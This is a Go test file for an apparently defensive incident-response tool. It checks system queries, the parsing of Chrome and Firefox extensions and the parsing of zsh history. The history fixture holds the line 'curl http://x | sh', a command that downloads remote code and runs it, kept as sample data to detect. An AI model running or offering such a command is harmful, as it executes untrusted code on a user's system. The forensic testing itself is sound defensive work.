package response

import (
	"context"
	"os"
	"path/filepath"
	"testing"
)

// Every kind answers on this OS: rows, or a clear "not available".
func TestEveryQueryKindAnswers(t *testing.T) {
	h := &Handler{}
	for _, k := range QueryKinds {
		p := Params{Kind: k}
		switch k {
		case "file_find":
			p.Match, p.Path = "hosts", "/etc"
		case "loaded_modules":
			p.Match = "libc"
		}
		r := h.query(context.Background(), p)
		envGap := containsStr(r.Message, "not available") || containsStr(r.Message, "not visible here")
		if !r.OK && !envGap {
			t.Errorf("%s: %s", k, r.Message)
			continue
		}
		if tb, ok := r.Data.(Table); ok {
			t.Logf("%-18s %4d rows  %v", k, len(tb.Rows), tb.Columns)
		} else {
			t.Logf("%-18s %s", k, r.Message)
		}
	}
}

func containsStr(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || filepath.Base(s) != "" && indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func TestBrowserExtensionsAndHistoryParsing(t *testing.T) {
	home := t.TempDir()
	ext := filepath.Join(home, ".config", "google-chrome", "Default", "Extensions", "abcdef", "1.2_0")
	os.MkdirAll(filepath.Join(ext, "_locales", "en"), 0o755)
	os.WriteFile(filepath.Join(ext, "manifest.json"), []byte(`{"name":"__MSG_appName__","version":"1.2","permissions":["cookies","<all_urls>"]}`), 0o644)
	os.WriteFile(filepath.Join(ext, "_locales", "en", "messages.json"), []byte(`{"appName":{"message":"Shady Helper"}}`), 0o644)
	ff := filepath.Join(home, ".mozilla", "firefox", "p1.default")
	os.MkdirAll(ff, 0o755)
	os.WriteFile(filepath.Join(ff, "extensions.json"), []byte(`{"addons":[{"id":"x@y","version":"3","type":"extension","location":"app-profile","active":true,"defaultLocale":{"name":"FF Ext"}}]}`), 0o644)
	_, rows, _ := qBrowserExtensions(map[string]string{"alice": home})
	if len(rows) != 2 || rows[0][4] != "Shady Helper" || rows[0][6] != "cookies <all_urls>" || rows[1][4] != "FF Ext" {
		t.Fatalf("%v", rows)
	}
	os.WriteFile(filepath.Join(home, ".zsh_history"), []byte(": 1700000000:0;curl http://x | sh\nls\n"), 0o600)
	_, rows, _ = qShellHistory(map[string]string{"alice": home})
	if len(rows) != 2 || rows[0][3] != "curl http://x | sh" || rows[0][2] != "1" {
		t.Fatalf("%v", rows)
	}
}
